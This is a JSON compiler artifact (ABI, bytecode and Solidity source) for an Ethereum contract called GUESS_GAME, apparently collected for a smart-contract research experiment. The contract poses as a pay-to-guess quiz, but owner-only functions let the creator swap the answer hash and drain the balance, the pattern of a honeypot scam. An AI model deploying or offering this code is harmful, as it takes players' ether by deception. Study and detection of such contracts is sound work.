{
  "contractName": "GUESS_GAME",
  "abi": [
    {
      "constant": true,
      "inputs": [],
      "name": "Question",
      "outputs": [
        {
          "name": "",
          "type": "string"
        }
      ],
      "payable": false,
      "stateMutability": "view",
      "type": "function"
    },
    {
      "payable": true,
      "stateMutability": "payable",
      "type": "fallback"
    },
    {
      "constant": false,
      "inputs": [
        {
          "name": "resp",
          "type": "string"
        }
      ],
      "name": "Play",
      "outputs": [],
      "payable": true,
      "stateMutability": "payable",
      "type": "function"
    },
    {
      "constant": false,
      "inputs": [
        {
          "name": "q",
          "type": "string"
        },
        {
          "name": "resp",
          "type": "string"
        }
      ],
      "name": "Setup",
      "outputs": [],
      "payable": true,
      "stateMutability": "payable",
      "type": "function"
    },
    {
      "constant": false,
      "inputs": [],
      "name": "Stop",
      "outputs": [],
      "payable": true,
      "stateMutability": "payable",
      "type": "function"
    },
    {
      "constant": false,
      "inputs": [
        {
          "name": "q",
          "type": "string"
        },
        {
          "name": "respHash",
          "type": "bytes32"
        }
      ],
      "name": "NewGame",
      "outputs": [],
      "payable": true,
      "stateMutability": "payable",
      "type": "function"
    }
  ],
  "bytecode": "0x608060405234801561001057600080fd5b5061071e806100206000396000f30060806040526004361061006d576000357c0100000000000000000000000000000000000000000000000000000000900463ffffffff168063648f0bde1461006f57806396686560146100cb578063bedf0f4a1461016d578063bfd66a4714610177578063c8166a8a146101e1575b005b6100c9600480360381019080803590602001908201803590602001908080601f0160208091040260200160405190810160405280939291908181526020018383808284378201915050505050509192919290505050610271565b005b61016b600480360381019080803590602001908201803590602001908080601f0160208091040260200160405190810160405280939291908181526020018383808284378201915050505050509192919290803590602001908201803590602001908080601f0160208091040260200160405190810160405280939291908181526020018383808284378201915050505050509192919290505050610395565b005b610175610471565b005b6101df600480360381019080803590602001908201803590602001908080601f0160208091040260200160405190810160405280939291908181526020018383808284378201915050505050509192919290803560001916906020019092919050505061052d565b005b3480156101ed57600080fd5b506101f66105af565b6040518080602001828103825283818151815260200191508051906020019080838360005b8381101561023657808201518184015260208101905061021b565b50505050905090810190601f1680156102635780820380516001836020036101000a031916815260200191505b509250505060405180910390f35b3273ffffffffffffffffffffffffffffffffffffffff163373ffffffffffffffffffffffffffffffffffffffff161415156102ab57600080fd5b806040518082805190602001908083835b6020831015156102e157805182526020820191506020810190506020830392506102bc565b6001836020036101000a0380198251168184511680821785525050505050509050019150506040518091039020600019166002546000191614801561032e5750673782dace9d9000003410155b15610392573373ffffffffffffffffffffffffffffffffffffffff166108fc3073ffffffffffffffffffffffffffffffffffffffff16319081150290604051600060405180830381858888f19350505050158015610390573d6000803e3d6000fd5b505b50565b600060010260025460001916141561046d57806040518082805190602001908083835b6020831015156103dd57805182526020820191506020810190506020830392506103b8565b6001836020036101000a038019825116818451168082178552505050505050905001915050604051809103902060028160001916905550816000908051906020019061042a92919061064d565b5033600160006101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff1602179055505b5050565b600160009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff163373ffffffffffffffffffffffffffffffffffffffff161415156104cd57600080fd5b3373ffffffffffffffffffffffffffffffffffffffff166108fc3073ffffffffffffffffffffffffffffffffffffffff16319081150290604051600060405180830381858888f1935050505015801561052a573d6000803e3d6000fd5b50565b600160009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff163373ffffffffffffffffffffffffffffffffffffffff1614151561058957600080fd5b816000908051906020019061059f92919061064d565b5080600281600019169055505050565b60008054600181600116156101000203166002900480601f0160208091040260200160405190810160405280929190818152602001828054600181600116156101000203166002900480156106455780601f1061061a57610100808354040283529160200191610645565b820191906000526020600020905b81548152906001019060200180831161062857829003601f168201915b505050505081565b828054600181600116156101000203166002900490600052602060002090601f016020900481019282601f1061068e57805160ff19168380011785556106bc565b828001600101855582156106bc579182015b828111156106bb5782518255916020019190600101906106a0565b5b5090506106c991906106cd565b5090565b6106ef91905b808211156106eb5760008160009055506001016106d3565b5090565b905600a165627a7a72305820f5bb92098f250998514ee06f2b3091219e38cde7da5794bf8c3bb2fb29f201ac0029",
  "source": "\n\ncontract GUESS_GAME\n{\n    string public Question;\n    address questionSender;\n    bytes32 responseHash;\n\n    function Play(string resp) public payable {\n        require(msg.sender == tx.origin);\n        if (responseHash == keccak256(resp) && msg.value >= 4 ether) {\n            msg.sender.transfer(address(this).balance);\n        }\n    }\n\n    function() public payable{}\n \n    function Setup(string q, string resp) public payable {\n        if (responseHash == 0x0) {\n            responseHash = keccak256(resp);\n            Question = q;\n            questionSender = msg.sender;\n        }\n    }\n    \n    function Stop() public payable {\n       require(msg.sender==questionSender);\n       msg.sender.transfer(address(this).balance);\n    }\n    \n    function NewGame(string q, bytes32 respHash) public payable {\n        require(msg.sender==questionSender);\n        Question = q;\n        responseHash = respHash;\n    }\n}",
  "sourcePath": "/home/XXX-1/smartrim-experiment/for-rlf/0xbe44b9ecbca8afc16cb7fe146c16fe98cbeed14d/contracts/0xbe44b9ecbca8afc16cb7fe146c16fe98cbeed14d.sol",
  "compiler": {
    "name": "solc",
    "version": "0.4.25+commit.59dbf8f1.Emscripten.clang"
  },
  "schemaVersion": "3.4.16",
  "updatedAt": "2025-08-14T04:05:46.250Z",
  "networkType": "ethereum",
  "devdoc": {
    "methods": {}
  },
  "userdoc": {
    "methods": {}
  }
}